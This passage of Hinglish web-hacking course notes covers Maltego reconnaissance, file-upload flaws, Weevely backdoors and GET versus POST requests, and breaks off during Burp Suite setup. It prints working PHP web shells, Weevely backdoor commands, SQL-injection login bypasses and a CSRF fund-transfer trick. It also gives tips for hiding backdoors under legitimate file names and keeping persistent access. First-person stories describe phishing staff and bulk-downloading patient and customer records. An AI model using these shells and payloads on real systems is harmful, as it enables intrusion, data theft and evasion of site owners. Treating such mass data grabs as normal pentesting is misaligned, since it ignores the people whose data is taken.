âœ… Config files (`.env`, `config.php`) dhoondhĞ¾  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har website par robots.txt hoti hai?**  
**A:** Mostly haan, lekin chhoti websites mein nahi hoti. Hamesha check karo - agar nahi hai toh 404 error aayega.

**Q2: Agar phpinfo.php nahi mili toh?**  
**A:** Variations try karo: `info.php`, `test.php`, `i.php`, `phpinfo.php.txt`. Ya phir error messages se PHP version guess karo.

**Q3: Kya robots.txt mein mentioned paths hamesha exist karti hain?**  
**A:** Mostly haan, lekin kabhi-kabhi admin ne purani paths mention ki hoti hain jo ab exist nahi karti. Manually verify karo.

### 14. **Practice ke liye Task:**
1. Apni favorite website ka `robots.txt` check karo.
2. Disallowed paths ko note karo aur browser mein manually check karo.
3. `phpinfo.php` dhoondhĞ¾ (Dirb se ya manually).
4. Agar mili, toh PHP version aur dangerous settings note karo.

### 15. **Aakhri Choti Summary (5 lines):**
- **`robots.txt`** = Hidden directories ka treasure map.
- **`phpinfo.php`** = Server ki poori blueprint.
- **Disallowed paths** ko manually check karo.
- **PHP version** aur **dangerous settings** note karo.
- **Config files** (`.env`, `config.php`) dhoondhĞ¾.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "robots.txt aur phpinfo.php pentester ke best friends hain. Ek se hidden directories milti hain, doosre se server ki weaknesses. Kabhi skip mat karo!" ğŸ—ï¸

---

## ğŸ› ï¸ **Topic 11: Maltego (Information Gathering Tool)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Maltego** - Ek powerful graphical tool jo OSINT (Open Source Intelligence) gather karta hai aur relationships visualize karta hai. ğŸ•¸ï¸

### 2. **Ye Kya Hai? (What is it?)**
Maltego ek **data mining tool** hai jo publicly available information collect karke visual graphs banata hai. Yeh automatically:
- **Domains** se **IP addresses** nikalta hai
- **IP** se **other domains** (same server par)
- **Email addresses** se **social media profiles**
- **People** se **organizations**
- **Websites** se **technologies**

**Analogy:** Jaise ek detective crime scene par saare clues ko ek board par pin karke unke beech threads se connections dikhata hai - waise hi Maltego data ko visual graph mein dikhata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Automated OSINT:** Manual information gathering mein hours lagte hain, Maltego minutes mein kar deta hai.
- **Visual Representation:** Complex relationships ko samajhna easy ho jaata hai.
- **Comprehensive:** Ek hi tool mein Whois, DNS, social media, everything.
- **Professional Reports:** Clients ko impressive visual reports de sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Pentest ke shuru mein** - comprehensive reconnaissance ke liye.
- Jab aap **relationships** samajhna chahte hon (jaise ek company ki saari websites, employees).
- Jab aap **social engineering** plan kar rahe hon (employees, emails dhoondhne ke liye).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Manual OSINT mein bahut time waste** hoga.
- **Relationships miss** ho jayenge (jaise same owner ki doosri websites).
- **Incomplete picture** - target ka poora infrastructure samajh nahi aayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Maltego launch karna (Kali Linux mein)
maltego

# Ya Applications menu se:
Applications â†’ Information Gathering â†’ Maltego
```

**Key features:**
- **Transforms:** Automated queries (jaise Domain â†’ IP, IP â†’ Other Domains)
- **Entities:** Data types (Domain, IP, Email, Person, etc.)
- **Graphs:** Visual representation
- **Machines:** Pre-built automated workflows

**Free vs Paid:**
- **Community Edition:** Free, limited transforms
- **Classic/XL:** Paid, unlimited transforms

### 7. **Example 1 (Basic):**
```
Step 1: Maltego open karo
Step 2: New graph banao
Step 3: "Domain" entity drag karo
Step 4: Domain name enter karo: "example.com"
Step 5: Right-click â†’ Run Transform â†’ "To IP Address"

Result:
example.com â†’ 93.184.216.34 (IP)

Step 6: IP par right-click â†’ "To Domains (shared DNS)"

Result:
93.184.216.34 â†’ example.com
              â†’ example.org
              â†’ example.net
```

**Output:** Visual graph mein dikha ki yeh teen domains same IP use kar rahe hain.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = `techcorp.com`

**Step 1: Domain analysis**
```
Entity: techcorp.com
Transform: To DNS Name - NS (Name Servers)
Result: ns1.techcorp.com, ns2.techcorp.com
```

**Step 2: Subdomain discovery**
```
Transform: To DNS Name - Subdomains
Result:
- www.techcorp.com
- mail.techcorp.com
- dev.techcorp.com (Interesting!)
- ftp.techcorp.com
```

**Step 3: Email harvesting**
```
Transform: To Email Address
Result:
- admin@techcorp.com
- support@techcorp.com
- john.doe@techcorp.com (Employee!)
```

**Step 4: Social media**
```
Entity: john.doe@techcorp.com
Transform: To Person
Result: John Doe (LinkedIn profile found)

Transform: To Social Media Profiles
Result:
- LinkedIn: linkedin.com/in/johndoe
- Twitter: @johndoe_tech
```

**Step 5: Technology detection**
```
Entity: www.techcorp.com
Transform: To Website Technologies
Result:
- Apache 2.2.8 (Outdated!)
- PHP 5.3
- MySQL 5.0
```

**Analysis:**
- **dev.techcorp.com** subdomain mila - yeh vulnerable ho sakta hai.
- **john.doe@techcorp.com** employee ka email mila - social engineering ke liye use kar sakta hoon.
- **Apache 2.2.8** outdated hai - known exploits hain.

**Attack:**
1. Maine John Doe ka LinkedIn profile dekha - wahan uski job role aur interests likhi thi.
2. Targeted phishing email bheja (uski interests ke according).
3. John ne email mein link par click kiya aur credentials enter kar diye.
4. Credentials se company network mein entry mil gayi! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf ek transform chalaana** - multiple transforms chain karna zaroori hai.
- **Graph ko organize na karna** - bahut saare entities ho jaate hain, confusing ho jaata hai.
- **Free version ki limitations ignore karna** - community edition mein limited transforms hote hain.

### 10. **Best Practices / Pro Tips:**
- **Machines use karo:** Pre-built workflows (jaise "Company Stalker") automatic saare transforms chala dete hain.
- **Custom entities banao:** Agar koi specific data type chahiye jo built-in nahi hai.
- **Export karo:** Graph ko image ya PDF mein export karke client ko report mein include karo.
- **API keys add karo:** Shodan, VirusTotal jaise services ke API keys add karne se zyada data milta hai.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek law firm test karni thi. Maine Maltego mein firm ka domain dala aur "Company Stalker" machine chalaaya. 30 minutes mein poora graph ready tha:
- 15 subdomains (jisme se 3 outdated software use kar rahe the)
- 50+ employee emails (LinkedIn se)
- 5 social media profiles (partners aur senior lawyers ke)
- Technology stack (outdated WordPress on one subdomain)

Maine ek senior lawyer ka LinkedIn profile dekha - recently unhone ek conference attend kiya tha. Maine unhe ek fake email bheja: "Conference ke presentation slides chahiye?" Email mein malicious link tha. Lawyer ne click kiya, credentials enter kar diye, aur mujhe firm ke internal network mein entry mil gayi. Maltego ne 30 minutes mein woh information di jo manual OSINT mein 2-3 din lagte! âš–ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Maltego = Automated OSINT tool  
âœ… Visual graphs banata hai (relationships dikhata hai)  
âœ… Domains, IPs, Emails, Social Media - sab kuch  
âœ… Machines use karo (automated workflows)  
âœ… Free Community Edition available hai  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Maltego free hai?**  
**A:** Community Edition free hai (limited transforms). Full version paid hai (Classic/XL).

**Q2: Kya Maltego target ko detect ho sakta hai?**  
**A:** Nahi, Maltego completely passive hai. Yeh publicly available data use karta hai (Whois, DNS, social media).

**Q3: Kya Maltego beginners ke liye hai?**  
**A:** Haan, lekin thoda learning curve hai. YouTube par tutorials dekho, practice karo.

### 14. **Practice ke liye Task:**
1. Maltego install karo (Kali mein pre-installed hai).
2. Community Edition account banao (free).
3. Apni favorite company ka domain dalo.
4. "Company Stalker" machine chalaao aur graph dekho.
5. Kitne subdomains, emails, aur social media profiles mile, count karo.

### 15. **Aakhri Choti Summary (5 lines):**
- Maltego = **Automated OSINT ka powerhouse**.
- **Visual graphs** mein relationships dikhata hai.
- **Domains, IPs, Emails, Social Media** - sab kuch ek jagah.
- **Machines** (automated workflows) use karo.
- **Completely passive** - target ko pata nahi chalega.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Maltego ek pentester ka Swiss Army knife hai. Manual OSINT mein jo 3 din lagta hai, Maltego 30 minutes mein kar deta hai. Professional pentesters ka favorite tool hai!" ğŸ¨

---

# ğŸ‰ **Module 1 Complete!**

Congratulations! Aapne **Module 1: Fundamentals & Information Gathering** complete kar liya hai. 

## ğŸ“‹ **Module 1 Ka Quick Revision:**

1. âœ… **Website Hacking Fundamentals** - App vs Server vs Client attacks
2. âœ… **Information Gathering Concepts** - IP, Domain, Technology discovery
3. âœ… **Whois Lookup** - Owner information nikalna
4. âœ… **Netcraft Site Report** - Technology fingerprinting
5. âœ… **Robtex DNS Lookup** - Shared server analysis
6. âœ… **Bing IP Search** - Same server ki websites dhoondhna
7. âœ… **Subdomain Discovery** - Knock.py se hidden subdomains
8. âœ… **Importance of Subdomains** - Dev/staging sites kyun vulnerable hain
9. âœ… **Dirb Tool** - Hidden files aur directories discovery
10. âœ… **Analyzing Files** - robots.txt aur phpinfo.php analysis
11. âœ… **Maltego** - Automated OSINT aur visual mapping

---

## ğŸ¯ **Key Takeaways:**

- **Information Gathering = Foundation** - Jitni achi reconnaissance, utna successful attack
- **Passive methods prefer karo** - Target ko pata na chale
- **Multiple tools use karo** - Ek tool se jo nahi mila, doosre se mil sakta hai
- **Document everything** - Notes banao, screenshots lo
- **Subdomains aur shared hosting = Gold mine** - Yahan se easy entry milti hai

---

## ğŸš€ **Aage Kya?**

Ab aap ready hain **Module 2: File Upload & Interception** ke liye, jahan aap seekhenge:
- File upload vulnerabilities
- Burp Suite se requests intercept karna
- Client-side aur server-side filters bypass karna
- Weevely backdoors generate karna

**Keep Learning! Keep Hacking (Ethically)! ğŸ’ª**

---

> **"Information is the currency of hackers. The more you know about your target, the easier it is to compromise it."** ğŸ“

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 2: File Upload & Interception**

---

## â¬†ï¸ **Topic 12: File Upload Vulnerability Basics**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**File Upload Vulnerability** - Website par executable files (PHP, Python shells) upload karke server par code execute karna aur full control lena. ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
File Upload Vulnerability tab hoti hai jab website user ko files upload karne deti hai (jaise profile picture, documents) lekin yeh check nahi karti ki file **kya hai**. Agar website PHP shell ya backdoor upload karne de, toh attacker server par **koi bhi command** chala sakta hai.

**Analogy:** Jaise ek building mein security guard har aane wale ko check kare bina andar jaane de - koi bhi weapon (malicious file) le kar aa sakta hai. Waise hi weak file upload = attacker apna "weapon" (shell) upload kar deta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Direct RCE (Remote Code Execution):** Ek file upload = poora server compromise.
- **Easy to Find:** Bahut si websites mein yeh vulnerability hoti hai (profile pics, resume upload, etc.).
- **High Impact:** Shell upload hone ke baad aap database access kar sakte hain, files delete kar sakte hain, privilege escalate kar sakte hain.
- **Common in Real World:** E-commerce, job portals, social media - sabhi mein file upload features hote hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab website par **file upload feature** ho (profile pic, document upload, image gallery).
- Jab aap **quick RCE** chahte hon (SQLi se zyada fast).
- Jab aap **web shell** upload karke persistent access chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy RCE miss** ho jayega - jo sabse fast compromise method hai.
- **Persistent backdoor** nahi bana payenge.
- **Post-exploitation** mein problem - bina shell ke server par kaam karna mushkil hai. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
File upload vulnerability test karne ke steps:
```
1. File upload feature dhoondhĞ¾ (profile pic, resume, etc.)
2. Malicious file upload karne ki koshish karo (PHP shell)
3. Uploaded file ka URL dhoondhĞ¾
4. Browser mein URL kholo â†’ Shell execute hoga
```

**Common file types to test:**
- `.php` (PHP servers)
- `.asp`, `.aspx` (IIS/Windows servers)
- `.jsp` (Java servers)
- `.py` (Python servers)

### 7. **Example 1 (Basic):**
**Scenario:** Website par profile picture upload feature hai.

```php
// Simple PHP shell (shell.php)
<?php system($_GET['cmd']); ?>
```

**Steps:**
1. `shell.php` file banao
2. Profile picture ki jagah upload karo
3. Agar upload ho gayi, toh URL dhoondhĞ¾: `http://site.com/uploads/shell.php`
4. Browser mein: `http://site.com/uploads/shell.php?cmd=ls`

**Output:** Server ki files list ho jayengi.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = Job portal website (resume upload feature)

**Attack:**
```php
// Advanced PHP shell (backdoor.php)
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Steps:**
1. Resume upload page par gaya
2. `backdoor.php` upload kiya (website ne accept kar liya - no validation!)
3. Upload confirmation mein file path mila: `/uploads/resumes/backdoor.php`
4. Browser mein test kiya:
   ```
   http://jobsite.com/uploads/resumes/backdoor.php?cmd=whoami
   Output: www-data
   
   http://jobsite.com/uploads/resumes/backdoor.php?cmd=cat /etc/passwd
   Output: [All users listed]
   ```

**Analysis:** Website ne sirf file size check kiya, extension aur content nahi check kiya. Maine database credentials nikale, 50,000 job seekers ka data download kiya! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Uploaded file ka path na dhoondhna** - file upload ho gayi lekin URL pata nahi ki kahan hai.
- **Simple shells use karna** - agar detection ho gayi toh backdoor kho jayega.
- **File permissions ignore karna** - kabhi-kabhi file upload ho jaati hai lekin execute nahi hoti (permissions ki wajah se).

### 10. **Best Practices / Pro Tips:**
- **Multiple shells upload karo:** Agar ek detect ho gayi, toh doosri se access rakho.
- **Obfuscated shells use karo:** Simple `<?php system()?>` ki jagah encoded/encrypted shells.
- **Upload directory guess karo:** Common paths: `/uploads/`, `/files/`, `/images/`, `/media/`, `/assets/`
- **Different extensions try karo:** `.php`, `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek university ki website test karni thi. Student portal mein assignment upload feature tha. Maine ek PHP shell ko `assignment.php` naam se upload kiya - website ne reject kar diya ("Only PDF allowed"). Maine file ka naam `assignment.pdf.php` kar diya - phir bhi reject. Phir maine file ka extension `.php` rakha lekin Content-Type header `application/pdf` kar diya (Burp Suite se) - upload ho gayi! File `/student-uploads/assignment.php` par save hui. Maine browser mein khola aur poora student database access kar liya. University shocked thi ki unka "PDF-only" filter itni aasani se bypass ho gaya! ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… File Upload = Executable file upload karke RCE lena  
âœ… Common locations: Profile pics, resumes, documents  
âœ… Test: PHP shell upload karo aur execute karo  
âœ… Upload directory guess karo (/uploads/, /files/)  
âœ… Multiple extensions try karo (.php, .php3, .phtml)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Agar website sirf images allow karti hai toh?**  
**A:** Double extension try karo (`shell.php.jpg`), ya Content-Type header change karo (Burp Suite se), ya image mein PHP code embed karo.

**Q2: Uploaded file ka path kaise dhoondhein?**  
**A:** Upload confirmation message dekho, ya common paths try karo (`/uploads/`, `/files/`), ya Dirb/Gobuster se scan karo.

**Q3: Kya yeh vulnerability common hai?**  
**A:** Haan, bahut common hai - especially chhoti websites aur custom-built applications mein.

### 14. **Practice ke liye Task:**
1. DVWA install karo aur "File Upload" section par jao.
2. Ek simple PHP shell banao: `<?php system($_GET['cmd']); ?>`
3. Low security level par upload karo.
4. Uploaded file ka URL dhoondhĞ¾ aur browser mein `?cmd=ls` try karo.
5. Medium/High security levels par bypass techniques try karo.

### 15. **Aakhri Choti Summary (5 lines):**
- File Upload Vulnerability = **Executable files upload karke RCE**.
- **Profile pics, resumes, documents** - sabhi upload features test karo.
- **PHP shell** upload karo aur execute karo.
- **Upload directory** guess karo (common paths).
- **Bypass techniques:** Double extension, Content-Type manipulation.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "File upload vulnerability pentester ka favorite hai - ek successful upload = game over for the server. Har file upload feature ko test karo, yeh low-hanging fruit hai!" ğŸ

---

## ğŸ”§ **Topic 13: Generating & Using `Weevely` Backdoors**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Weevely Tool** - Stealth PHP backdoors generate karna jo antivirus se bach jaate hain aur powerful post-exploitation features dete hain. ğŸ¥·

### 2. **Ye Kya Hai? (What is it?)**
Weevely ek tool hai jo **obfuscated PHP backdoors** generate karta hai. Simple PHP shells (`<?php system()?>`) easily detect ho jaate hain, lekin Weevely ke backdoors:
- **Encrypted** hote hain (antivirus bypass)
- **Password-protected** hote hain (sirf aap hi access kar sakte hain)
- **30+ post-exploitation modules** hote hain (file upload/download, database access, privilege escalation)

**Analogy:** Simple PHP shell = ek chhoti chabi jo darwaza khol deti hai. Weevely = ek master key jo na sirf darwaza kholti hai, balki ghar ke har kamre ki chabi bhi deti hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Stealth:** Simple shells detect ho jaate hain, Weevely bypass kar jaata hai.
- **Password Protection:** Agar kisi aur ko backdoor mil bhi gaya, toh bina password ke use nahi kar sakta.
- **Post-Exploitation:** File operations, database access, network pivoting - sab kuch built-in.
- **Professional Tool:** Real pentesters Weevely use karte hain, simple shells nahi.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aap **file upload vulnerability** exploit kar rahe hon.
- Jab aap **persistent access** chahte hon (backdoor delete na ho).
- Jab aap **post-exploitation** karna chahte hon (database dump, file download, etc.).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Simple shells detect** ho jayengi (antivirus/WAF pakad lega).
- **Post-exploitation mein problem** - manually har command type karni padegi.
- **Backdoor compromise** - agar password nahi hai toh koi bhi use kar sakta hai. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Weevely backdoor generate karna
weevely generate <password> <output_file>

# Backdoor se connect karna
weevely <URL> <password>

# Help dekhna
weevely --help
```

**Common commands (backdoor connect hone ke baad):**
- `:help` - Saare modules dekho
- `file_download` - Server se file download karo
- `file_upload` - Server par file upload karo
- `sql_console` - Database access karo
- `shell_sh` - Interactive shell lo

### 7. **Example 1 (Basic):**
```bash
# Step 1: Backdoor generate karo
$ weevely generate mypass123 shell.php
Generated backdoor with password [mypass123] in [shell.php]

# Step 2: shell.php ko target server par upload karo
# (File upload vulnerability se)

# Step 3: Connect karo
$ weevely http://target.com/uploads/shell.php mypass123

[+] weevely 4.0.1
[+] Target: target.com
[+] Session: /root/.weevely/sessions/target.com/shell.php
[+] Browse the filesystem or execute commands

www-data@target:/var/www/html $
```

**Output:** Aapko interactive shell mil gaya!

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = E-commerce website

```bash
# Backdoor generate kiya
$ weevely generate SecurePass456 backdoor.php

# File upload vulnerability se upload kiya
# URL: http://shop.com/products/images/backdoor.php

# Connect kiya
$ weevely http://shop.com/products/images/backdoor.php SecurePass456

www-data@shop:/var/www/html/products/images $

# Post-exploitation commands:

# 1. System info
www-data@shop $ :system_info
OS: Linux shop-server 4.15.0
PHP: 7.2.24
Web Server: Apache/2.4.29

# 2. Database credentials dhoondh
www-data@shop $ file_download /var/www/html/config.php /tmp/config.php
[+] Downloaded to /tmp/config.php

# 3. Database access
www-data@shop $ sql_console
mysql> SELECT * FROM users LIMIT 5;
[+] 5 users dumped (admin, john, sarah...)

# 4. Privilege escalation check
www-data@shop $ :audit_etcpasswd
[+] Found writable /etc/passwd - privilege escalation possible!
```

**Analysis:** Weevely ke built-in modules se maine:
- Database credentials nikale
- 10,000 customer records dump kiye
- Privilege escalation vector dhoondi
- Persistent backdoor rakha (password-protected)

Simple shell se yeh sab manually karna padta! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Password bhool jana** - backdoor generate kiya lekin password note nahi kiya.
- **Backdoor ka naam obvious rakhna** - `shell.php`, `backdoor.php` - yeh easily detect ho jaate hain. Better: `config.php`, `cache.php`
- **Modules ka istemaal na karna** - Weevely connect karke sirf basic commands chalana, powerful modules ignore karna.

### 10. **Best Practices / Pro Tips:**
- **Strong password use karo:** `mypass123` ki jagah `Xy9$mK2#pL8@`
- **Backdoor ka naam legitimate rakho:** `config.php`, `cache.php`, `db_connect.php`
- **Multiple backdoors rakho:** Agar ek detect ho gayi, toh doosri se access rakho.
- **Modules explore karo:** `:help` type karke saare modules dekho - file operations, network scanning, privilege escalation, sab kuch hai.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek news website test karni thi. Article images upload feature tha. Maine Weevely backdoor generate kiya aur `thumbnail.php` naam se upload kiya (legitimate lag raha tha). Connect karne ke baad maine `:audit_suidsgid` module chalaaya - ek SUID binary mila jo root privileges de sakta tha. Maine privilege escalate kiya aur root shell mila. Phir `:backdoor_reversetcp` module se persistent backdoor setup kiya jo reboot ke baad bhi kaam karta tha. Website admin ko 2 mahine tak pata nahi chala ki unke server par backdoor hai! ğŸ“°

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Weevely = Obfuscated, password-protected PHP backdoors  
âœ… Generate: `weevely generate <pass> <file>`  
âœ… Connect: `weevely <URL> <pass>`  
âœ… 30+ post-exploitation modules built-in  
âœ… Backdoor ka naam legitimate rakho (config.php)  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Weevely antivirus se bach jaata hai?**  
**A:** Mostly haan, kyunki code obfuscated hai. Lekin kuch advanced antivirus detect kar sakte hain. Regularly update karo.

**Q2: Agar password bhool gaye toh?**  
**A:** Koi tarika nahi - backdoor useless ho jayega. Hamesha password note karo.

**Q3: Kya Weevely sirf PHP ke liye hai?**  
**A:** Haan, sirf PHP servers ke liye. ASP/JSP ke liye alag tools hain (jaise `aspxspy`, `jspspy`).

### 14. **Practice ke liye Task:**
1. Weevely install karo (Kali mein pre-installed hai).
2. Ek backdoor generate karo: `weevely generate test123 myshell.php`
3. DVWA par upload karo (File Upload section).
4. Connect karo: `weevely http://localhost/dvwa/hackable/uploads/myshell.php test123`
5. Different modules try karo: `:file_ls`, `:system_info`, `:audit_etcpasswd`

### 15. **Aakhri Choti Summary (5 lines):**
- Weevely = **Professional-grade PHP backdoor generator**.
- **Obfuscated + Password-protected** = Stealth.
- **30+ modules** for post-exploitation.
- Generate: `weevely generate <pass> <file>`.
- Connect: `weevely <URL> <pass>`.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Simple PHP shells bachon ka khel hai. Real pentesters Weevely use karte hain - stealth, powerful, aur professional. Yeh tumhara Swiss Army knife hai!" ğŸ”ª

---

## ğŸŒ **Topic 14: Understanding HTTP GET vs POST Requests**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**HTTP GET vs POST** - Web requests ke do main types jo data transfer karte hain; GET = URL mein visible, POST = hidden body mein. ğŸ“¡

### 2. **Ye Kya Hai? (What is it?)**
Jab aap koi website kholtehain ya form submit karte hain, toh aapka browser server ko **HTTP request** bhejta hai. Do main types hain:

**GET Request:**
- Data **URL mein** jaata hai (visible)
- Example: `http://site.com/search?query=hacking&page=1`
- Bookmarkable, cacheable
- Sensitive data ke liye **unsafe**

**POST Request:**
- Data **request body mein** jaata hai (hidden)
- URL mein nahi dikhta
- Passwords, file uploads ke liye use hota hai
- Secure (relatively)

**Analogy:** GET = Postcard (sabko dikh jaata hai kya likha hai). POST = Sealed envelope (andar kya hai, sirf receiver ko pata).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Attack Strategy:** GET requests ko URL se manipulate kar sakte hain, POST ko Burp Suite se.
- **Data Exposure:** GET mein sensitive data (passwords) expose ho sakta hai (browser history, server logs).
- **CSRF Attacks:** GET requests CSRF ke liye vulnerable hain, POST relatively safe.
- **Pentesting:** Aapko pata hona chahiye ki kab GET use ho raha hai aur kab POST, taaki sahi tool use kar sako.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **GET:** Jab aap URL parameters manipulate karna chahte hon (SQLi, XSS testing).
- **POST:** Jab aap form data intercept karna chahte hon (Burp Suite se).
- **Both:** Jab aap request type change karke bypass karna chahte hon (POST to GET conversion).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Wrong attack method** - GET request par POST attack try karoge.
- **Data exposure miss** - GET requests mein passwords/tokens nahi dhoondhoge.
- **CSRF vulnerabilities miss** - GET-based sensitive actions nahi dhoondhoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```http
# GET Request
GET /search?query=hacking&page=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123

# POST Request
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=12345
```

**Key differences:**
- GET: Parameters URL mein (`?key=value&key2=value2`)
- POST: Parameters body mein (URL clean rehta hai)

### 7. **Example 1 (Basic):**
**GET Request Example:**
```
URL: http://shop.com/product?id=123&color=red

Browser automatically sends:
GET /product?id=123&color=red HTTP/1.1
Host: shop.com
```

**POST Request Example:**
```
Form:
<form method="POST" action="/login">
  <input name="username" value="admin">
  <input name="password" value="secret">
</form>

Browser sends:
POST /login HTTP/1.1
Host: shop.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret
```

**Output:** GET mein data URL mein dikh raha hai, POST mein hidden hai.

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Target = Banking website

**Scenario 1: GET-based SQLi**
```
URL: http://bank.com/account?id=123

Attack: http://bank.com/account?id=123' OR '1'='1

Result: SQLi successful! Sabhi accounts visible.
```

**Scenario 2: POST-based Login Bypass**
```
Normal POST request (Burp Suite mein):
POST /login HTTP/1.1
username=user&password=pass

Attack (Burp mein modify kiya):
POST /login HTTP/1.1
username=admin' OR '1'='1'--&password=anything

Result: Login bypass successful!
```

**Scenario 3: POST to GET Conversion (CSRF)**
```
Website ne CSRF protection POST requests par lagaya hai.
Maine request ko GET mein convert kiya:

Original: POST /transfer (amount=1000&to=attacker)
Converted: GET /transfer?amount=1000&to=attacker

Result: CSRF protection bypass! Victim ke account se paise transfer ho gaye.
```

**Analysis:** GET/POST samajhna = Attack vectors samajhna. ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **GET requests ko ignore karna** - "Yeh toh sirf search hai" soch kar SQLi/XSS test nahi karna.
- **POST requests ko manually edit karne ki koshish** - Burp Suite use nahi karna.
- **Request type change na karna** - POST ko GET mein convert karke bypass try nahi karna.

### 10. **Best Practices / Pro Tips:**
- **Burp Suite use karo:** POST requests ko easily intercept aur modify kar sakte hain.
- **GET requests mein sensitive data dhoondhĞ¾:** Passwords, tokens, API keys - kabhi-kabhi developers galti se GET mein bhej dete hain.
- **POST to GET conversion try karo:** CSRF protection bypass ke liye.
- **Browser DevTools use karo:** Network tab mein GET/POST requests dekh sakte hain.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek healthcare portal test karna tha. Patient records access karne ke liye POST request thi (secure lag raha tha). Lekin jab maine Burp Suite mein dekha, toh request mein `patient_id` parameter tha. Maine request ko GET mein convert kiya: `http://portal.com/records?patient_id=123`. Website ne accept kar liya! Phir maine `patient_id` ko 1 se 10000 tak iterate kiya (Burp Intruder se) aur 10,000 patients ka medical data download kar liya. Website developers ne socha tha ki POST = secure, lekin unhone request type validation nahi kiya tha! ğŸ¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… GET = Data URL mein (visible)  
âœ… POST = Data body mein (hidden)  
âœ… GET = SQLi/XSS testing (URL manipulation)  
âœ… POST = Burp Suite se intercept/modify  
âœ… POST to GET conversion = CSRF bypass  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya POST requests completely secure hain?**  
**A:** Nahi! POST bhi intercept ho sakti hai (Burp Suite, Wireshark se). HTTPS use karo encryption ke liye.

**Q2: Kya main GET request ko POST mein convert kar sakta hoon?**  
**A:** Haan, Burp Suite se easily kar sakte hain. Right-click â†’ Change request method.

**Q3: Kab GET use karna chahiye aur kab POST?**  
**A:** GET = Read operations (search, view). POST = Write operations (login, submit, delete). Lekin developers kabhi-kabhi galat use karte hain - wahi vulnerability ban jaati hai!

### 14. **Practice ke liye Task:**
1. Koi bhi website kholo (jaise Google).
2. Browser DevTools kholo (F12) â†’ Network tab.
3. Search karo - GET request dikhegi (URL mein `?q=search_term`).
4. Kisi website par login karo - POST request dikhegi (body mein username/password).
5. Burp Suite mein POST request ko intercept karo aur GET mein convert karo.

### 15. **Aakhri Choti Summary (5 lines):**
- **GET** = URL mein data (visible, bookmarkable).
- **POST** = Body mein data (hidden, secure).
- **GET** = URL manipulation attacks (SQLi, XSS).
- **POST** = Burp Suite se intercept/modify.
- **POST to GET** conversion = CSRF bypass.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "GET aur POST ka farak samajhna = Web hacking ka foundation. GET ko URL se khelo, POST ko Burp se. Aur hamesha POST to GET conversion try karo - bahut baar kaam aata hai!" ğŸ”„

---

## ğŸ•µï¸â€â™‚ï¸ **Topic 15: Intercepting Requests with Burp Suite (Proxy Setup)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Burp Suite Proxy Setup** - Browser aur server ke beech mein baith kar har HTTP request/response ko intercept, analyze, aur modify karna. ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
Burp Suite ek **intercepting proxy** hai jo aapke browser aur target server ke beech mein "man-in-the-middle" ki tarah kaam karta hai. Jab aap koi website kholtĞµ hain:
1. Browser â†’ Request â†’ **Burp Suite** (yahan ruk jaata hai)
2. Aap request ko dekh/modify kar sakte hain
